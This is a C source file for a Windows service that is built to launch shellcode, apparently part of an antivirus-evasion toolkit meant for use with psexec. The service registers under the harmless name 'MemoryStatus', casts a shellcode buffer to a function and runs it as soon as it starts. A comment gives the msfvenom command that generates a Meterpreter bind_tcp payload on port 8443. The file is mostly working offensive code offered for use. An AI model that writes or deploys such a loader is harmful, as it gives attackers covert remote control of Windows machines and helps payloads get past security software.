// compile:
// wine gcc -m32 psexecservice.c

#include <windows.h>
#include <stdio.h>
#include "defs.h"

#define SLEEP_TIME 5000
#ifdef PRINT_DEBUG
	#define LOGFILE "C:\\avetdbg.txt"
#endif

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void  ServiceMain(int argc, char** argv); 
void  ControlHandler(DWORD request); 
int InitService();
#ifdef PRINT_DEBUG
int WriteToLog(char*);
#endif

// some shellcode
//# msfvenom -p windows/meterpreter/bind_tcp lport=8443 -f c -a x86 --platform Windows
//unsigned char buf[] = 
//unsigned char *shellcode = buf;

void exec_shellcode(unsigned char *shellcode)
{
#ifdef PRINT_DEBUG
	int d=sizeof(shellcode);
	char s[200];
	sprintf(s,"shellcode size: %d\n",d);
	WriteToLog(s);
#endif
	int (*funct)();
	funct = (int (*)()) shellcode;
	(int)(*funct)();
}

#ifdef PRINT_DEBUG
int WriteToLog(char* str)
{
	FILE* log;
	log = fopen(LOGFILE, "a+");
	if (log == NULL)
		return -1;
	fprintf(log, "%s\n", str);
	fclose(log);
	return 0;
}
#endif

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MemoryStatus";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    // Start the control dispatcher thread for our service
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}


void ServiceMain(int argc, char** argv) 
{ 
    int error; 
 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler(
		"SomeService", 
		(LPHANDLER_FUNCTION)ControlHandler); 
    if (hStatus == (SERVICE_STATUS_HANDLE)0) 
    { 
        // Registering Control Handler failed
        return; 
    }  
    // Initialize Service 
    error = InitService(); 
    if (error) 
    {
		// Initialization failed
        ServiceStatus.dwCurrentState       = SERVICE_STOPPED; 
        ServiceStatus.dwWin32ExitCode      = -1; 
        SetServiceStatus(hStatus, &ServiceStatus); 
        return; 
    } 
    // We report the running status to SCM. 
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
#ifdef PRINT_DEBUG
    WriteToLog("start shellcode\n");
#endif    
    exec_shellcode(buf);
#ifdef PRINT_DEBUG
    WriteToLog("shellcode executed\n");	
#endif
    // The worker loop of a service
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
	{
		// do nothing
		Sleep(SLEEP_TIME);
	}
    return; 
}

 
// Service initialization
int InitService() 
{ 
    
    int result;
#ifdef PRINT_DEBUG
    result = WriteToLog("start service");
#endif
    return(result); 
} 

// Control handler function
void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
 
    // Report current status
    SetServiceStatus (hStatus,  &ServiceStatus);
 
    return; 
} 

